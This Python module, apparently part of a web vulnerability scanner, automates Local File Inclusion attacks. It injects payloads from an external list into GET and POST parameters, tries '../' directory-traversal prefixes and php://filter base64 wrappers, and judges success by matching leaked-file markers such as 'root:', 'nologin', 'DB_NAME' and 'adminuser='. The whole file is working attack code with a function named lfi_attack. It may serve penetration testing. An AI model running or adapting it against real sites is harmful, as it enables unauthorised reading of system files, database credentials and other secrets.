#LFI patch clear
import requests
import os
import re
import base64
import json
import time
from urllib import parse

def make_GET_form(url: str):
    dic = {}
    dic['vuln'] = 'LFI'
    dic['method'] = 'GET'
    dic['url'] = url
    return dic


def make_POST_form(url: str, data: dict):
    dic = {}
    dic['vuln'] = 'LFI'
    dic['method'] = 'POST'
    dic['url'] = url
    dic['data'] = data
    return dic


def get_request(data, dic, target, cookies):
    deeper = "../../../../../../../.."
    php_filter = "php://filter/convert.base64-encode/resource="

    key_list = list(dic.keys())
    for payload_name in key_list:
        tmp = dic
        tmp[payload_name] = '@@@@@@'
        middle_form = target
        key_list_tmp = list(tmp.keys())
        for idx, key in enumerate(key_list_tmp):
            if idx == 0:
                middle_form = middle_form + '?' + key + '=' + tmp[key]
            else:
                middle_form = middle_form + '&' + key + '=' + tmp[key]
        for payload in data:
            #scan with encode
            if payload.startswith('%'):
                final_form = middle_form.replace('@@@@@@', payload.strip())
                try:
                    test_res = requests.get(final_form, cookies=cookies)
                    if check_success(test_res.text):
                        return make_GET_form(final_form)
                except:
                    print('lfi error')
                    time.sleep(2)
            else:#scan with filename
                for i in range(0,2):
                    final_form = middle_form.replace('@@@@@@', (deeper*i)+payload.strip())
                    try:
                        test_res = requests.get(final_form, cookies=cookies)
                        if check_success(test_res.text):
                            return make_GET_form(final_form)
                    except:
                        print('lfi error')
                        time.sleep(2)
                #scan with php filter
                final_form = middle_form.replace('@@@@@@', php_filter + payload.strip())
                try:
                    test_res = requests.get(final_form, cookies=cookies)
                    if check_success(test_res.text):
                        return make_GET_form(final_form)
                except:
                    print('lfi error')
                    time.sleep(2)

    return False


def scan_type1(url: str, params: dict, cookies):
    deeper = "../../../../../../../.."
    php_filter = "php://filter/convert.base64-encode/resource="

    with open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
        data = f.readlines()

    for items in params.values():
        target = url + items['action']
        method = items['method']
        dic = {}
        for ipt in items['inputs']:
            dic[ipt['name']] = ipt['value']

        if method == 'post':
            key_list = list(dic.keys())
            for payload_name in key_list:
                tmp = dic
                for payload in data:
                    #scan with encode
                    if payload.startswith('%'):
                        tmp[payload_name] = payload.strip()
                        try:
                            test_res = requests.post(target, data=tmp, cookies=cookies)
                            if check_success(test_res.text):
                                return make_POST_form(target, tmp)
                        except:
                            print('lfi error')
                            time.sleep(2)
                    else:#scan with filename
                        for j in range(0,2):
                            tmp[payload_name] = (deeper*j)+payload.strip()
                            try:
                                test_res = requests.post(target, data=tmp, cookies=cookies)
                                if check_success(test_res.text):
                                    return make_POST_form(target, tmp)
                            except:
                                print('lfi error')
                                time.sleep(2)
                        #scan with php filter
                        tmp[payload_name] = php_filter+payload.strip()
                        try:
                            test_res = requests.post(target, data=tmp, cookies=cookies)
                            if check_success(test_res.text):
                                return make_POST_form(target, tmp)
                        except:
                            print('lfi error')
                            time.sleep(2)

        elif method == 'get':
            return get_request(data, dic, target, cookies)
        else:
            print('Error in ' + target + ', method type must be assigned')
            return False
    return False


def scan_type2(url: str, cookies):
    with open(os.path.dirname(os.path.realpath(__file__)) + '/lfi.txt', "r") as f:
        data = f.readlines()

    params = re.split('[=&?]', url)
    target = params[0]
    del (params[0])
    key = ''
    dic = {}
    for i in range(len(params)):
        if i % 2 == 0:
            key = params[i]
        else:
            dic[key] = params[i]

    return get_request(data, dic, target, cookies)


def check_success(res):
    word_list = ['root:','sbin','nologin','DB_NAME','daemon:','DOCUMENT_ROOT=','PATH=','HTTP_USER_AGENT','HTTP_ACCEPT_ENCODING=','users:x','GET /','HTTP/1.1','HTTP/1.0','apache_port=','cpanel/logs/access','allow_login_autocomplete','database_prefix=','emailusersbandwidth','adminuser=']
    for wrd in word_list:
        if re.search(wrd, res):
            return True
    return False


def lfi_attack(arg1: str, arg2, cookies):
    if arg1.startswith('http'):
        return scan_type1(arg1, arg2, cookies)
    elif arg1 == 'get':
        return scan_type2(arg2, cookies)
    else:
        print('Error in lfi_attack')
        return False